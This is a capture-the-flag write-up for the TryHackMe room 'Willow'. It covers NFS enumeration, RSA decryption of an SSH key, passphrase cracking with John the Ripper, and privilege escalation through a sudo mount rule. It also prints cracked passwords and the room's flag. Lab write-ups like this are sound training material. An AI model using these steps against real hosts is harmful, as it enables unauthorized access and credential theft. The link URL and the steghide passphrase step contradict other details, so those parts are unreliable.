# TryHackMe: Willow Writeup

**Room Link:** [Willow](https://tryhackme.com/room/dvwa)

---

## Initial Enumeration

Starting with an Nmap scan:

```bash
nmap <target-ip>
```

**Results:**
```text
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
2049/tcp open  nfs
```

Four services are open. The NFS share on port 2049 is particularly interesting.

## NFS Enumeration

Listing available NFS exports:

```bash
showmount -e <target-ip>
```

```text
Export list for <target-ip>:
/var/failsafe *
```

Mounting the share:

```bash
sudo mkdir /mnt/nfs
sudo mount -t nfs <target-ip>:/var/failsafe /mnt/nfs
ls /mnt/nfs
# rsa_keys
cat /mnt/nfs/rsa_keys
```

```text
Public Key Pair: (23, 37627)
Private Key Pair: (61527, 37627)
```

We now have the RSA key pairs: `e=23`, `d=61527`, `n=37627`.

## Web Enumeration & Decoding

The website displays a large block of hex-encoded numbers. Decoding from hex using [CyberChef](https://gchq.github.io/CyberChef/) reveals:

```text
Hey Willow, here's your SSH Private key -- you know where the decryption key is!
2367 2367 2367 2367 2367 9709 8600 28638 18410 1735 ...
```

The numbers following the message are RSA-encrypted values. Using the private key pair `(d=61527, n=37627)` with an [RSA calculator](https://www.cs.drexel.edu/~popyack/Courses/CSP/Fa17/notes/10.1_Cryptography/RSA_Express_EncryptDecrypt_v2.html), we decrypt each number to recover the SSH private key:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2E2F405A3529F92188B453CAA6E33270

qUVUQaJ+YmQRqto1knT5nW6m61mhTjJ1/ZBnk4H0O5jObgJoUtOQBU+hqSXzHvcX
wLbqFh2kcSbF9SHn0sVnDQOQ1pox2NnGzt2qmmsjTffh8SGQBsGncDei3EABHcv1
...
-----END RSA PRIVATE KEY-----
```

The key is encrypted with AES-128-CBC, so we need the passphrase.

## Cracking the SSH Key Passphrase

Converting the key to a crackable format with `ssh2john`:

```bash
ssh2john ssh_key > id.hash
```

Cracking with John the Ripper:

```bash
john id.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
wildflower       (ssh_key)
```

**Passphrase:** `wildflower`

## Initial Access via SSH

```bash
ssh -o PubkeyAcceptedKeyTypes=ssh-rsa -i ssh_key willow@<target-ip>
```

## User Flag

After logging in as `willow`, we retrieve the user flag. The `user.txt` file is actually a JPG image — we'll come back to it later.

## Privilege Escalation: willow -> root

Checking sudo permissions:

```bash
sudo -l
```

```text
User willow may run the following commands on willow-tree:
    (ALL : ALL) NOPASSWD: /bin/mount /dev/*
```

We can mount any device under `/dev/`. Exploring the available devices:

```bash
ls /dev
```

We find a `hidden_backup` device. Mounting it:

```bash
sudo /bin/mount /dev/hidden_backup /mnt/creds
cat /mnt/creds/creds.txt
```

```text
root:7QvbvBTvwPspUK
willow:U0ZZJLGYhNAT2s
```

Switching to root:

```bash
su root
# Password: 7QvbvBTvwPspUK
```

```bash
whoami
# root
```

## Root Flag

Navigating to `/root`:

```bash
cat /root/root.txt
# This would be too easy, don't you think? I actually gave you the root flag some time ago.
# You've got my password now -- go find your flag!
```

The root flag is hidden inside `user.jpg` using steganography. Extracting it:

```bash
steghide --extract -sf user.jpg
# Enter passphrase: (empty)
# wrote extracted data to "root.txt"
cat root.txt
```

**Root Flag:** `THM{find_a_red_rose_on_the_grave}`
